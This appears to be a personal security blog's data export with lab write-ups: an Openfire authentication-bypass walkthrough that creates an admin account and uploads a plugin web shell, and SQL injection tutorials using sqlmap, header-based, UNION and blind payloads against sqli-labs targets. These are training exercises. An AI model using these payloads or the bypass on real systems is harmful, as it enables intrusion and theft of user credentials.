{"meta":{"title":"X8@0E的博客","subtitle":"X8@0E","description":"一个酷爱学习的女码农","author":"X8@0E","url":"http://example.com","root":"/"},"pages":[{"title":"tags","date":"2025-07-26T08:01:56.000Z","updated":"2025-07-26T08:02:25.063Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"文章归档","date":"2025-07-26T07:58:28.702Z","updated":"2025-07-26T06:32:00.780Z","comments":true,"path":"archives.html","permalink":"http://example.com/archives.html","excerpt":"","text":""},{"title":"categories","date":"2025-07-26T07:41:27.000Z","updated":"2025-07-26T11:14:55.763Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"CVE-2023-323115","slug":"openfire","date":"2025-11-19T03:24:45.961Z","updated":"2025-11-20T10:42:33.071Z","comments":true,"path":"2025/11/19/openfire/","permalink":"http://example.com/2025/11/19/openfire/","excerpt":"","text":"一、信息收集 1GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp #在url处修改 出现上面这种情况就直接证明存在这个openfire漏洞 二、openfire漏洞的利用获取JSESSION和csrftoken 123GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jspJSESSIONID=node01ws340mmgb12o1njvi1gr6blah3.node0csrf=z4Jxmdu7JFFMd7V 然后利用获取到的JSESSION和csrftoken来创建新的用户名test跟密码test 1GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=z4Jxmdu7JFFMd7V&amp;username=test&amp;name=&amp;email=&amp;password=test&amp;passwordConfirm=test&amp;isadmin=on&amp;create=Create+User 1Cookie: JSESSIONID=node01ws340mmgb12o1njvi1gr6blah3.node0;csrf=z4Jxmdu7JFFMd7V 成功创建新的用户test 三、上传shell接下来就是一个一个点击这个后台里面的功能点，看看有没有什么可以上传文件的地方或者其他可以利用的地方 后面发现上面有一个插件的地方有上传的地方，尝试这个利用点，我是在github上面找了一个上传openfire shell的jar利用文件 1https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/tag/v0.1 我是下载插件的源代码重新打包jar的，在kali里面添加需要的环境然后执行打包的命令，打包完之后就会直接在目录下面生成jar后缀的文件 123456# 安装完整的 JDK（包含 javac）sudo apt install openjdk-11-jdk -y# 安装 Mavensudo apt install maven -y#进入到源代码的目录下mvn clean package 接下来就是直接上传openfire shell到靶机上面 显示上传成功，创建的密码是123 四、获取flag 至此渗透测试结束","categories":[{"name":"春秋云镜.com","slug":"春秋云镜-com","permalink":"http://example.com/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-com/"}],"tags":[{"name":"openfire","slug":"openfire","permalink":"http://example.com/tags/openfire/"}]},{"title":"SQL注入-SQLMAP基础使用","slug":"SQL注入-SQLMAP基础使用","date":"2025-11-13T03:50:46.248Z","updated":"2025-12-08T09:53:35.260Z","comments":true,"path":"2025/11/13/SQL注入-SQLMAP基础使用/","permalink":"http://example.com/2025/11/13/SQL%E6%B3%A8%E5%85%A5-SQLMAP%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/","excerpt":"","text":"SQL注入-SQLMAP基础使用1实验原理SQLMAP是一个开源的自动化SQL注入工具，其主要功能是扫描、发现并利用给定的URL的SQL注入漏洞。SQLMAP的基本功能包括：判断可注入的参数、判断可以使用哪一种SQL注入技术进行注入、判断识别数据库的类型以及根据用户的选择从数据库中读取数据。SQLMAP支持的注入技术包括以下五种：（1）基于布尔的盲注：根据返回页面判断条件真假的注入。（2）基于时间的盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。（3）基于报错的注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。（4）基于联合查询的注入：可以使用UNION的情况下的注入。（5）堆查询注入：同时执行多条语句的注入。SQLMAP支持的数据库类型主要包括一些关系型数据库（RMDBS），如MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、Informix、HSQLDB等。 登录后，根据网页提示，先给定一个GET参数，即： 1http://[靶机IP]/sqli-labs/Less-3/?id=1 此时页面显示id&#x3D;1的用户名Dump、密码Dump。 在命令行工具cmd中输入以下命令，进入SQLMAP程序所在的路径： 1cd C:\\Users\\Administrator\\Desktop\\tools\\装机工具\\sqlmap-master 进入SQLMAP程序所在的路径后，使用以下命令启动SQLMAP帮助： 1python sqlmap.py -h 寻找注入点使用以下命令自动寻找网站的注入点，并获取网站及后台数据库的基本信息： 1python sqlmap.py -u &quot;http://[靶机IP]/sqli-labs/Less-3/?id=1&quot; 检测结果如下图所示： 获取所有数据库的库名（1）使用以下命令获取所有数据库的库名： 1python sqlmap.py -u &quot;http://[靶机IP]/sqli-labs/Less-3/?id=1&quot; --dbs 检测结果如下图所示： （2）使用以下命令获取网站当前所在数据库的库名： 1python sqlmap.py -u &quot;http://[靶机IP]/sqli-labs/Less-3/?id=1&quot; --current-db 检测结果：网站当前所在数据库的库名为security。 获取security数据库中所有的表名使用以下命令获取security数据库中所有的表名： 1python sqlmap.py -u &quot;http://[靶机IP]/sqli-labs/Less-3/?id=1&quot; -D security --tables 检测结果：security数据库中含有emails、referers、uagents、users四张表。 其中，有一个名为users的表，这当中可能存放着网站用户的基本信息。 获取users表的全部字段名使用以下命令获取users表的全部字段名： 1python sqlmap.py -u &quot;http://[靶机IP]/sqli-labs/Less-3/?id=1&quot; -D security -T users --columns 检测结果：users表中有三个字段id、username和password。 获取users表id、username和password字段的全部值使用以下命令获取users表id、username和password字段的全部值： 1python sqlmap.py -u &quot;http://[靶机IP]/sqli-labs/Less-3/?id=1&quot; -D security -T users -C id,username,password --dump 检测结果如下图所示： 实验至此结束。 SQL注入-SQLMAP基础使用2就多一个-r参数的基本使用方法。利用Burpsuite工具拦截HTTP请求包 在Firefox地址栏中给定一个GET参数，将URL修改为： 1http://[靶机IP]/sqli-labs/Less-4/?id=1 回车提交，此时观察Burpsuite是否能正常拦截到此HTTP请求报文。 （6）保存此HTTP请求包 在Burpsuite的Proxy-&gt;Intercept界面下选中刚刚拦截到的HTTP请求报文的全部内容，单击鼠标右键，在弹出的菜单中选择copy，将请求包的内容拷贝至文本文档a.txt中，并保存至C盘根目录。 启动SQLMAP在命令行工具cmd中输入以下命令，进入SQLMAP程序所在的路径： 1cd C:\\Users\\Administrator\\Desktop\\tools\\装机工具\\sqlmap-master 进入SQLMAP程序所在的路径后，使用以下命令启动SQLMAP帮助： 1python sqlmap.py -h 寻找注入点使用以下命令自动寻找网站的注入点，并获取网站及后台数据库的基本信息： 1python sqlmap.py -r C:\\a.txt 检测结果如下图所示： 获取所有数据库的库名（1）使用以下命令获取所有数据库的库名： 1python sqlmap.py -r C:\\a.txt --dbs 检测结果如下图所示： （2）使用以下命令获取网站当前所在数据库的库名： 1python sqlmap.py -r C:\\a.txt --current-db 检测结果：网站当前所在数据库的库名为security。 获取security数据库中所有的表名使用以下命令获取security数据库中所有的表名： 1python sqlmap.py -r C:\\a.txt -D security --tables 检测结果：security数据库中含有emails、referers、uagents、users四张表。 其中，有一个名为users的表，这当中可能存放着网站用户的基本信息。 7．获取users表的全部字段名使用以下命令获取users表的全部字段名： 1python sqlmap.py -r C:\\a.txt -D security -T users --columns 检测结果：users表中有三个字段id、username和password。 获取users表id、username和password字段的全部值使用以下命令获取users表id、username和password字段的全部值： 1python sqlmap.py -r C:\\a.txt -D security -T users -C id,username,password --dump 检测结果如下图所示： 实验至此结束。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQLMAP","slug":"SQLMAP","permalink":"http://example.com/tags/SQLMAP/"}]},{"title":"SQL注入-HTTP头部注入","slug":"SQL注入-HTTP头部注入","date":"2025-11-13T03:09:38.695Z","updated":"2025-12-08T09:49:53.289Z","comments":true,"path":"2025/11/13/SQL注入-HTTP头部注入/","permalink":"http://example.com/2025/11/13/SQL%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5/","excerpt":"","text":"SQL注入-HTTP头部注入1实验原理有时候，后台开发人员为了验证客户端HTTP Header（比如常用的Cookie验证等）或者通过HTTP Header头信息获取客户端的一些信息（比如User-Agent、Accept字段等），会对客户端HTTP Header进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTP Header的注入漏洞。常见的HTTP Header注入类型包括Cookie注入、Referer注入、User-Agent注入、XFF注入等。 本实验的目标是：以Webug3.0网站的第五关为入口，利用报错注入的方式实施SQL注入，获取网站后台数据库中存放的flag。利用Burpsuite工具拦截HTTP请求包 在FireFox浏览器访问的Less-18登录验证界面，输入用户名admin、密码admin，然后点击Submit按钮， 此时Burpsuite会拦截到HTTP请求包： （6）将Burpsuite工具拦截到的HTTP请求包发送至Repeater模块。 后续的步骤中，可以在Repeater选项卡下的Request栏中设置注入的payload，设置完成后点击Send按钮发送，并在Response栏中观察目标服务器的响应。 寻找注入点在原始HTTP请求包的头部字段User-Agent末尾添加单引号，即使用如下payload： 1User-Agent:Mozilla/5.0......Firefox/46.0&#x27; 发现服务器端报错！ 在原始HTTP请求包的头部字段User-Agent末尾添加如下符号，使用如下payload： 1User-Agent:Mozilla/5.0......Firefox/46.0&#x27;,&#x27;&#x27;,&#x27;&#x27;)# 服务器端未报错！ 由此可以判断，目标网站在POST参数处存在字符型注入点。 注：如果在服务器端（靶机）上查看Less-18的php代码，会发现其中存在这样一段代码： 1$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;; 这也是一种基于Insert的注入场景。 获取网站当前所在数据库的库名使用以下payload获取网站当前所在数据库的库名： 1User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,database())),&#x27;&#x27;,&#x27;&#x27;)# 显示结果为security。 获取数据库security的全部表名使用以下payload获取数据库security的全部表名： 1User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;))),&#x27;&#x27;,&#x27;&#x27;)# 显示结果中，有一个名为users的表，这当中可能存放着网站用户的基本信息。 注意：extractvalue()函数所能显示的错误信息最大长度为32，如果错误信息超过了最大长度，有可能导致显示不全。因此，有时需要借助limit来做分行显示，上述payload可以改为： 12345678910User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1))),&#x27;&#x27;,&#x27;&#x27;)#//显示security库中的第1张表的名字User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1))),&#x27;&#x27;,&#x27;&#x27;)#//显示security库中的第2张表的名字User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,1))),&#x27;&#x27;,&#x27;&#x27;)#//显示security库中的第3张表的名字... 6．获取users表的全部字段名使用以下payload获取users表的全部字段名： 1User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;))),&#x27;&#x27;,&#x27;&#x27;)# 显示结果，users表中有id、username和password三个字段。 同上一个步骤相似，为了避免错误信息太长导致显示不全，有时需要借助limit来做分行显示，上述payload可以改为： 12345678910User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1))),&#x27;&#x27;,&#x27;&#x27;)#//显示users表中的第1个字段的名字User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 1,1))),&#x27;&#x27;,&#x27;&#x27;)#//显示users表中的第2个字段的名字User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 2,1))),&#x27;&#x27;,&#x27;&#x27;)#//显示users表中的第3个字段的名字... 7．获取users表id、username和password字段的全部值由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如 （1）显示第1组数据 1User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1))),&#x27;&#x27;,&#x27;&#x27;)# 显示结果为Dump，Dump。 （2）显示第2组数据 1User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 1,1))),&#x27;&#x27;,&#x27;&#x27;)# 显示结果为Angelina，I-kill-you。 以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。实验至此结束。 SQL注入-HTTP头部注入2实验原理有时候，后台开发人员为了验证客户端HTTP Header（比如常用的Cookie验证等）或者通过HTTP Header头信息获取客户端的一些信息（比如User-Agent、Accept字段等），会对客户端HTTP Header进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTP Header的注入漏洞。常见的HTTP Header注入类型包括Cookie注入、Referer注入、User-Agent注入、XFF注入等。 寻找注入点（1）对拦截到的HTTP请求包不做任何修改，直接点击Send发送，此时Response-&gt;Pretty下显示的内容： Response-&gt;Render下显示的内容： 2）在原始的HTTP请求包中添加头部字段X-Forwarded-For，并使用如下payload： 1X-Forwarded-For:a&#x27; 此时，服务器端报错！ 由此可以判断，目标网站在头部字段XFF处存在注入点。判断网站查询的字段数使用如下payload判断网站查询的字段数： 1X-Forwarded-For:order by 2 未报错！ 1X-Forwarded-For:order by 5 报错！ 由上述结果可以判断，网站查询的字段数为4。 判断网站的回显位置使用如下payload判断网站的回显位置： 1X-Forwarded-For:union select 1,2,3,4 由上述结果可以判断，网站有三个回显位置：2号位、3号位和4号位。 获取网站当前所在的数据库的库名使用如下payload获取网站当前所在的数据库的库名： 1X-Forwarded-For:union select 1,database(),3,4 由上述结果可以得知，网站当前所在的数据库的库名为pentesterlab。 获取pentesterlab数据库中所有的表名使用如下payload获取pentesterlab数据库中所有的表名： 1X-Forwarded-For:union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;pentesterlab&#x27; 由上述结果可以得知，pentesterlab数据库中含有comment、flag、goods和user四张表。其中，flag表中可能存放着flag信息。 8．获取flag表中的字段名使用如下payload获取flag表中的字段名： 1X-Forwarded-For:union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=&#x27;pentesterlab&#x27; and table_name=&#x27;flag&#x27; 由上述结果可以得知，flag表中有两个字段id、flag。 9．获取flag表中的flag字段的内容使用如下payload获取flag表中的flag字段的内容： 1X-Forwarded-For:union select 1,flag,3,4 from pentesterlab.flag 由上述结果可以得知，该flag字段的内容为204f704fbbcf6acf398ffee11989b377。实验至此结束。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]},{"title":"SQL注入-基于时间的盲注","slug":"SQL注入-基于时间的盲注","date":"2025-11-12T16:21:37.244Z","updated":"2025-12-08T09:47:38.707Z","comments":true,"path":"2025/11/13/SQL注入-基于时间的盲注/","permalink":"http://example.com/2025/11/13/SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8/","excerpt":"","text":"SQL注入-基于时间的盲注实验原理（1）关于时间（延时）盲注 某些场合下，页面只有一种返回结果，使用具有延时功能的函数sleep()、benchmark()等，通过判断这些函数是否正常执行来获取数据库中的数据。 （2）一些功能函数的说明 length(str)：返回字符串（str）的长度，以字节为单位。substr(str,pos,len)：从指定的位置（pos）开始，截取并返回字符串（str）指定长度（len）的子串。ascii(str)：返回字符串（str）最左边字符的ASCII码。if(expr1,expr2,expr3)：条件判断函数，expr1为true则返回expr2，expr1为false则返回expr3。sleep(N)：让语句延迟执行一段时间（N秒），执行成功后返回0。benchmark(count,expr)：让expr执行count次，执行成功后返回0。 登录后，根据网页提示，给定一个?id&#x3D;1的参数，即： 1http://[靶机IP]/sqli-labs/Less-9/?id=1 此时页面显示信息为You are in…。 如果给定一个?id&#x3D;-1的参数，即： 1http://[靶机IP]/sqli-labs/Less-9/?id=-1 此时页面显示信息仍然为You are in…。 可以继续给定不同的id参数进行尝试，发现页面的显示结果只有一种：You are in…。由此可以判断，这是一种典型的时间（延时）盲注场景！ 寻找注入点使用sleep()函数判断注入点的类型： 1http://[靶机IP]/sqli-labs/Less-9/?id=1 and sleep(5)--+ sleep(5)未执行，页面无明显延迟。 1http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and sleep(5)--+ sleep(5)成功执行，页面有明显延迟！ 由上述结果可以判断，网站存在字符型注入点。盲猜网站当前所在数据库的库名长度假设当前所在数据库的库名长度为N，尝试使用判断语句if((length(database())&#x3D;M),sleep(5),1)，不断变化M的值去猜测，如果M等于N，此时sleep(5)会成功执行，页面应该会有明显延迟。 例如执行如下payload： 1http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(length(database())=7,sleep(5),1)--+ 页面无明显延迟，说明网站当前所在数据库的库名长度不是7个字符。 1http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(length(database())=8,sleep(5),1)--+ 页面有明显延迟，说明网站当前所在数据库的库名长度为8个字符！ 盲猜网站当前所在数据库的库名字符串本步骤通过逐个字母盲猜的方式进行。 假设库名字符串的第1个字母为a，那么条件判断语句 if(substr(库名字符串,1,1)&#x3D;‘a’,sleep(5),1) 以及 if(ascii(substr(库名字符串,1,1))&#x3D;97,sleep(5),1) 中，sleep(5)能成功执行，页面应该会有明显延迟； 假设库名字符串的第2个字母为b，那么条件判断语句 if(substr(库名字符串,2,1)&#x3D;‘b’,sleep(5),1) 以及 if(ascii(substr(库名字符串,2,1))&#x3D;98,sleep(5),1) 中，sleep(5)能成功执行，页面应该会有明显延迟； … 以此类推。 猜测库名的第1个字母： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+ 页面有明显延迟，证明库名的第1个字母为s，猜测正确。 猜测库名的第2个字母： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr(database(),2,1)=&#x27;e&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr(database(),2,1))=101,sleep(5),1)--+ 页面有明显延迟，证明库名的第2个字母为e，猜测正确。 以此类推，最终得到的字符串结果为security。 盲猜数据库security的全部表名（1）猜测第1张表的表名 猜测第1张表的表名的第1个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)=&#x27;e&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))=101,sleep(5),1)--+ 页面有明显延迟，证明第1张表的表名的第1个字符为e，猜测正确。 猜测第1张表的表名的第2个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),2,1)=&#x27;m&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),2,1))=109,sleep(5),1)--+ 页面有明显延迟，证明第1张表的表名的第2个字符为m，猜测正确。 以此类推，得到security库中的第1张表的名字为emails。 （2）猜测第2张表的表名 猜测第2张表的表名的第1个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),1,1)=&#x27;r&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),1,1))=114,sleep(5),1)--+ 页面有明显延迟，证明第2张表的表名的第1个字符为r，猜测正确。 以此类推，得到security库中的第2张表的名字为referers。 依据上述方法，通过不断变换limit和substr()函数中的参数，可以最终得到security库中所有表的表名：emails、referers、uagents和users。其中，第4张表users当中可能存放着网站用户的基本信息。 6．盲猜users表的全部字段名（1）猜测第1个字段名 猜测第1个字段名的第1个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;i&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=105,sleep(5),1)--+ 页面有明显延迟，证明第1个字段名的第1个字符为i，猜测正确。 猜测第1个字段名的第2个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),2,1)=&#x27;d&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),2,1))=100,sleep(5),1)--+ 页面有明显延迟，证明第1个字段名的第2个字符为d，猜测正确。 以此类推，得到users表中的第1个字段名为id。 依据上述方法，通过不断变换limit和substr()函数中的参数，可以最终得到users表中所有字段名：id、username和password。 7．盲猜users表username和password字段的全部值（1）猜测第1组数据 猜测第1组数据的第1个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),1,1)=&#x27;D&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),1,1))=68,sleep(5),1)--+ 页面有明显延迟，证明第1组数据的第1个字符为D，猜测正确。 猜测第1组数据的第2个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),2,1)=&#x27;u&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),2,1))=117,sleep(5),1)--+ 页面有明显延迟，证明第1组数据的第2个字符为u，猜测正确。 以此类推，得到第1组数据为“Dump,Dump”。 注意：字符串中的逗号（,）也是需要进行猜测比对的！例如第1组数据的第5个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),5,1)=&#x27;,&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 0,1),5,1))=44,sleep(5),1)--+ （2）猜测第2组数据 猜测第2组数据的第1个字符： 123http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 1,1),1,1)=&#x27;A&#x27;,sleep(5),1)--+或http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr((select concat_ws(&#x27;,&#x27;,username,password) from security.users limit 1,1),1,1))=65,sleep(5),1)--+ 页面有明显延迟，证明第2组数据的第1个字符为A，猜测正确。 以此类推，得到第2组数据为“Angelina,I-kill-you”。 依据上述方法，通过不断变换limit和substr()函数中的参数，可以最终得到users表中username和password字段的全部值。实验至此结束。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]},{"title":"SQL注入-基于布尔的盲注","slug":"SQL注入-基于布尔的盲注","date":"2025-11-12T15:54:38.937Z","updated":"2025-12-08T09:46:08.166Z","comments":true,"path":"2025/11/12/SQL注入-基于布尔的盲注/","permalink":"http://example.com/2025/11/12/SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8/","excerpt":"","text":"SQL注入-基于布尔的盲注基于字符型注入的基础 实验原理（1）关于布尔盲注 某些场合下，页面返回的结果只有两种（正常或错误）。通过构造SQL判断语句，查看页面的返回结果（True or False）来判断哪些SQL判断条件成立，通过此来获取数据库中的数据。 （2）一些功能函数的说明 length(str)：返回字符串（str）的长度，以字节为单位。substr(str,pos,len)：从指定的位置（pos）开始，截取并返回字符串（str）指定长度（len）的子串。ascii(str)：返回字符串（str）最左边字符的ASCII码。 登录后，根据网页提示，给定一个?id&#x3D;1的参数，即： 1http://[靶机IP]/sqli-labs/Less-8/?id=1 此时页面显示信息为You are in…，显示状态为True。 如果给定一个?id&#x3D;-1的参数，即： 1http://[靶机IP]/sqli-labs/Less-8/?id=-1 此时页面显示信息为空，显示状态为False。 可以继续给定不同的id参数进行尝试，发现页面的显示结果只有两种：True或False。由此可以判断，这是一种典型的布尔盲注场景！ 寻找注入点分别使用以下3条payload寻找注入点及判断注入点的类型： 1http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; 运行后页面显示为False！ 1http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and &#x27;1&#x27;=&#x27;1 运行后页面显示为True！ 1http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and &#x27;1&#x27;=&#x27;2 运行后页面显示为False！ 由上述结果可以判断，网站存在字符型注入点。盲猜网站当前所在数据库的库名长度假设当前所在数据库的库名长度为N，尝试使用判断语句length(database())&#x3D;M，不断变化M的值去猜测，如果M不等于N，页面应该显示为False；如果M等于N，页面应该显示为True。 例如执行如下payload： 1http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and length(database())=7--+ 显示结果为False，说明网站当前所在数据库的库名长度不是7个字符！ 1http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and length(database())=8--+ 显示结果为True，说明网站当前所在数据库的库名长度为8个字符！ 盲猜网站当前所在数据库的库名字符串本步骤通过逐个字母盲猜的方式进行。 假设库名字符串的第1个字母为a，那么条件判断语句 substr(库名字符串,1,1)&#x3D;‘a’ 以及 ascii(substr(库名字符串,1,1))&#x3D;97 返回的结果均应为True（小写字母a的ASCII码为97）； 假设库名字符串的第2个字母为b，那么条件判断语句 substr(库名字符串,2,1))&#x3D;‘b’ 以及 ascii(substr(库名字符串,2,1))&#x3D;98 返回的结果均应为True（小写字母b的ASCII码为98）； … 以此类推。 猜测库名的第1个字母： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr(database(),1,1)=&#x27;s&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr(database(),1,1))=115--+ 库名的第1个字母为s。 猜测库名的第2个字母： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr(database(),2,1)=&#x27;e&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr(database(),2,1))=101--+ 库名的第2个字母为e。 以此类推，最终得到的字符串结果为security。 盲猜数据库security的全部表名（1）猜测第1张表的表名 猜测第1张表的表名的第1个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)=&#x27;e&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))=101--+ 第1张表的表名的第1个字符为e。 猜测第1张表的表名的第2个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),2,1)=&#x27;m&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),2,1))=109--+ 第1张表的表名的第2个字符为m。 以此类推，得到security库中的第1张表的名字为emails。 猜测第2张表的表名 猜测第2张表的表名的第1个字符： 123http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),1,1)=&#x27;r&#x27;--+或http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),1,1))=114--+ 